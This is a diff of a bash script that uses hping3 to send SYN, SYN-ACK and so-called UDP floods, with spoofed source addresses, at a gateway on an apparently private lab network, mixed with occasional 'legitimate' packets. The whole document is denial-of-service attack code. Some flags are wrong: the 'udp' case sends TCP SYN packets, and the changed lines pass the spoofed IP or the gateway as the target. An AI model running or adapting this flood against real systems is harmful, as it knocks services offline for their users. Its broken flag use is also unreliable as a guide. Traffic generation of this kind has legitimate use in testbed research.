@@ -2,7 +2,7 @@
 
 # Target information
 gateway_ip="10.1.5.3"  # Gateway IP
-legitimate_client_ip="10.1.4.2"  # Client 3 IP
+legitimate_client_ip="10.1.2.2"  # Client 1 IP
 
 # Function to generate a random IP for spoofing
 rand_ip() {
@@ -37,16 +37,18 @@ while true; do
 
   case "$packet_type" in
     udp)
-      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" --interface eth1 $gateway_ip
+      sleep 1
       ;;
     syn)
-      hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" --interface eth1 $spoofed_ip
+      sleep 1
       ;;
     syn-ack)
-      hping3 -c 10000 -d "$packet_size" -S -A --flood -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 10000 -d "$packet_size" -S -A --flood -p "$target_port" --interface eth1 $spoofed_ip 
       ;;
     legitimate)
-      hping3 -c 1 -d "$packet_size" -p "$target_port" $spoofed_ip $gateway_ip
+      hping3 -c 1 -d "$packet_size" -p "$target_port" $spoofed_ip 
       sleep 1  # Send one legitimate packet per second
       ;;
     *)
